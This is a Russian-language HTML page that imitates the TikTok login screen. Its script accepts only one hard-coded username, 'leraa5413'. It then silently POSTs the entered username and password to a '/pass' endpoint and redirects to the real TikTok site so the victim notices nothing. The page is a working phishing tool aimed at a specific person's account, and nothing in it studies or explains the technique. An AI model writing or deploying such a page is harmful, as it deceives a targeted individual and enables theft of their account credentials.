<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход | TikTok</title>
    <style>
        body { margin: 0; background-color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .login-card { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        h1 { font-size: 24px; margin-bottom: 24px; color: #161823; font-weight: 700; }
        .input-group { margin-bottom: 12px; }
        input { width: 100%; height: 44px; background: #f1f1f2; border: 1px solid rgba(22, 24, 35, 0.06); border-radius: 4px; padding: 0 12px; box-sizing: border-box; font-size: 14px; }
        #error-msg { color: #fe2c55; font-size: 12px; margin-bottom: 12px; text-align: left; display: none; }
        .btn-login { width: 100%; height: 44px; background-color: #fe2c55; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

<div class="login-card">
    <h1>Войти</h1>
    <form id="authForm">
        <div class="input-group">
            <input type="text" id="username" placeholder="Имя пользователя" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Пароль" required>
        </div>
        <div id="error-msg">Неправильное имя пользователя или пароль. Попробуйте еще раз.</div>
        <button type="submit" class="btn-login">Войти</button>
    </form>
</div>

<script>
    const VALID_USERNAME = "leraa5413";

    document.getElementById('authForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const error = document.getElementById('error-msg');

        if (user !== VALID_USERNAME) {
            error.style.display = 'block';
            document.getElementById('username').style.border = '1px solid #fe2c55';
        } else {
            // Отправка данных на сервер
            try {
                await fetch('/pass', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: user,
                        password: pass
                    })
                });
            } catch (err) {
                console.error('Ошибка при отправке данных');
            }

            // Перенаправление на TikTok в любом случае
            window.location.href = "https://www.tiktok.com";
        }
    });
</script>

</body>
</html>
